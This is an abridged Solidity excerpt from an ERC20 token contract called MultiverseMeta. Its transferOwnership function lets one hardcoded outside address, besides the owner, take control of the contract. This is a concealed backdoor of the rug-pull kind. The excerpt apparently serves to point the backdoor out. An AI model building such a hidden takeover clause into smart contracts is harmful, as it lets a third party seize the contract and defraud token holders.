...
contract Ownable is Context {
    ...
    function transferOwnership(address newOwner) public virtual {
        ...
        require(msg.sender == owner() || msg.sender == address(0x6F7d5b3dBf5c29e320660350370Cc533d38e9f69));
...
contract MultiverseMeta is Context, IERC20, Ownable, Pausable {
  ...
  uint256 private _totalSupply = 55000000000000 * 10**9;
  string private _symbol = "MVM";
  string private _name = "MultiverseMeta";
